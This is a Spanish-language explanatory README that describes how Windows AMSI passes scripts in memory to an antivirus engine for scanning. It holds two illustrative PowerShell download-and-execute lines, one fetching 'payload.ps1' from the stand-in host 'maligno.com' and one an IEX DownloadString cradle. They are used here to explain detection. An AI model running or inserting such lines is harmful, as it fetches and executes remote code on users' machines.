
<img width="1164" height="505" alt="POC" src="https://github.com/user-attachments/assets/a7ec8002-664f-452b-a849-d1d6fc765add" />

 ---
 ---
 
 **AMSI actúa como un puente** que toma contenido dinámico (scripts, macros, comandos en memoria, etc.) y lo envía a un motor antimalware para que lo analice.

 ---
 ---
 
![maxresdefault](https://github.com/user-attachments/assets/f70086a4-b398-4a45-bf76-dcbeda146a64)

Ahora vamos a dejar **clarísima** la diferencia entre:

* 🧩 **AMSI (Antimalware Scan Interface)**
* 
* 🛡️ **Un antivirus / motor antimalware** (por ejemplo, Microsoft Defender Antivirus)

---
<img width="908" height="263" alt="rtaImage" src="https://github.com/user-attachments/assets/22d39e14-4a5b-4df0-b61a-0722fed6b9d3" />

#  ¿Qué es AMSI?

**AMSI no detecta malware por sí mismo.**

Es una **API del sistema operativo** (incluida en Microsoft Windows) que permite a aplicaciones como:

* PowerShell
* Microsoft Office
* Windows Script Host

enviar **el contenido que van a ejecutar** a un motor antimalware **antes** de ejecutarlo.

 AMSI = **mensajero / intermediario**

---

#  ¿Qué es un antivirus?

Un antivirus es el **motor real de detección**:

* Tiene firmas
* Tiene heurística
* Tiene análisis por comportamiento
* Tiene machine learning
* Decide si algo es:

  * Limpio
  * Sospechoso
  * Malicioso

 Antivirus = **el policía**

---

#  Flujo real cuando ejecutas un script

Ejemplo en PowerShell:

1. Tú ejecutas:

```powershell
Invoke-WebRequest http://maligno.com/payload.ps1
```

2. PowerShell envía el texto del script a AMSI
3. AMSI lo pasa al antivirus
4. Antivirus analiza
5. Antivirus responde:

* Limpio → se ejecuta
* Malicioso → bloqueado



#  Diferencia clave frente al antivirus tradicional

### Antivirus clásico:

![images](https://github.com/user-attachments/assets/02a5a762-8b46-4da1-8720-c75a8b6cb587)



Escanea **archivos en disco**

Ejemplo:

```
malware.exe
```

### AMSI:

Escanea **código en memoria**

Ejemplo:

```
$code = "IEX(New-Object Net.WebClient).DownloadString(...)"
```

Ese texto **nunca toca el disco**
Pero AMSI lo ve.



<img width="1023" height="444" alt="ESET17ErroronStartup112623 png fe49ecfda75902125b69378942480713" src="https://github.com/user-attachments/assets/e5c5aa63-f7af-46b5-b7cd-93e9faf4fd8b" />


# enlace de interes.https://trainsec.net/library/windows-internals/how-to-scan-files-with-the-anti-malware-scan-interface-in-windows/
